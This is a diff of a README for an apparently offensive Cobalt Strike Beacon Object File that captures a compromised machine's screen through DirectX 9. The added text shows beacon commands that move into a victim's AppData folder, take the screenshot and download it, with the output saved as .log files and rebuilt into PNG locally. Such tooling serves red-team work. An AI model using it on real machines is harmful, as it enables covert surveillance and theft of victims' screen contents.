@@ -1,17 +1,39 @@
 # DirectX9-Screenshot-BOF
-Takin Screenshots with Directx9 baby
 
-Screenshots taken with DirectX // COM Libraries
+## Overview
 
-The screenshots are exported to the current working directory and saved as a .log file.
+Capture Screenshots with DirectX 9
 
-Output Format: \<width>oo\<height>.log
+## Notes
+
+- Export screenshots to the **current working directory** as `.log` files
+- Output format: `<width>oo<height>.log`
+- Reconstruct `.log` files into PNG format locally
+
+### BOF Execution
+
+Ensure you are in the directory you would like the screenshot exported as. 
+```
+beacon> cd C:\Users\Victim\AppData\
+beacon> screenshot-dx
+beacon> download <filename>
+```
+
+### Example
 
 ![Cobalt Strike Example](/img/cobalt-test.png)
 
+## Image Reconstruction
 
-Reconstruct into PNG Locally
-```
-pip3 install Pillow
-python3 assemble.py 2560oo1440.log test.png
-```
+To reconstruct the image with this script, follow these steps:
+
+1. Install the required packages:
+    ```bash
+    pip3 install Pillow
+    ```
+
+2. Run the script with the desired log file path and output file path:
+    ```bash
+    python3 assemble.py 2560oo1440.log test.png
+    ```
+
